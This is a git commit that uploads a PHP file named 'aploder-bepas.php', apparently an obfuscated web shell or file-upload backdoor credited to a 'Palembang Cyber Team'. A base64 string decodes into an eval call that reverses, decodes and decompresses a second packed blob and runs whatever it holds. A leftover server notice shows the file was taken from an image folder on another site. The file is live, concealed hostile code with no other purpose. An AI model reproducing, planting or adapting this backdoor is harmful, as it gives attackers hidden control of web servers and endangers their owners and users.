4751e0c4d62d1a0fbd956db06ffb6fd155237bb1
dorzkim <63092001+dorzkim@users.noreply.github.com>
2024-11-15 21:49:27 +0700

    Add files via upload

---
+++ aploder-bepas.php
@@ -0,0 +1,14 @@
+<br />
+<b>Notice</b>:  Undefined index: HTTP_ACCEPT_LANGUAGE in <b>/home/UNO/UNO/absen/assets/img/user/bypas7.php</b> on line <b>236</b><br />
+<?php
+/*
+		                The Given Code Was Successfully Obfuscated By Palembang Cyber Team
+						From : http://accorhotels.localmeasure.com/obfus.php
+									     Thanks For Using
+							      Tools Coded By ./Chu404
+*/
+$Palembang = "ZXZhbCUyOCUyNyUzRiUyNmd0JTNCJTI3Lmd6dW5jb21wcmVzcyUyOGd6aW5mbGF0ZSUyOGd6aW5mbGF0ZSUyOGJhc2U2NF9kZWNvZGUlMjhzdHJyZXYlMjglMjRjaHV4cCUyOSUyOSUyOSUyOSUyOSUyOSUzQg==";
+$chuxp = "p8SuGHwfJ6zQq7m8T+QbyI8GmBf6sPxmRN9J3rxYDGc4i/84y7G6+p/1OXdsyMYpNlQX2jx40lL3Q2eXY7QvQmZqaEsHlU9o6dLJ5BaupTmYaHPPxu/0vVdH62+rzbWNEyhYb35nS97a+s5Q3dNsPC2qS4FiCuzmNdLg6zZC5eOQc8R3AFEEh9S1KDfZ3ZCjq0WuwlmAy5yQzPaE2DB/hLMWLo4X9Uwvli8KTJYIltG00v4tLKnwhaPBW61SBLgmtNQ13TOV0/V3BdashSqzCcvL2eTr79/pWTZFuRaNasHqwwzkHunXwbgGXytSV2Zgtd/stWCenjF6s0xzXumSr1r+NuBfbs1rx/2cHOsCdm+QBI3e0/jfcb9nm6m9xkYADaAE52x4RdLSSVm2qYjy104uSpluo9Mi3KosChZ3m+rFHobp6m+ol5F/sMZjCJ8LhAt4hbnta0ILcOTwk9yuUcj/9NfX/8Bf3CpbZ0DZ6+RvMAe5kF2JrDo/KzKkreMpzaI+oaqXrtx/8ujCXizCQzyJ/i4eG44n3fpVDoAOhxEuCmICgIlW4+jBaQ18LCnmUehkDehq44TiwS/yvY0ZBkwpCkMRqXjYtYJoDr82+ndflg0jOScbTzatld57GXintYJrNTxqcBO6kx9zxu9pWwuSa5WW9u/iZUJWZdpmlmlEeNroWL+es27KdQalCn10iVTgRSms3+8pDHv9j4Uu0pgAaeqxHukAQpbt6CnggTrOFXcxSQI0qlvnsc1wyQcTliGTSqQ6RryWs2T+KDv5jowqwFT0coNFtatYqM4Ai8XJo5MFp4li1ikXLcStFyYXKsRSeJUmWnphOfpQxPuJr25yRchBkXQ5SKZTTXQi4mtuaJVp4T/Vo5PMnmEzB3gcosX9vXdeU1pnzFv779Jn5+SqhhABrz62Jljz/TryZbHyiPXM14cOUFCI+kwNJKwYQktNUjAQdziScDtGh/fqe5PEwM9btRVtciX/VIg6B0PEC8eA";
+eval(htmlspecialchars_decode(urldecode(base64_decode($Palembang))));
+exit;
+?>
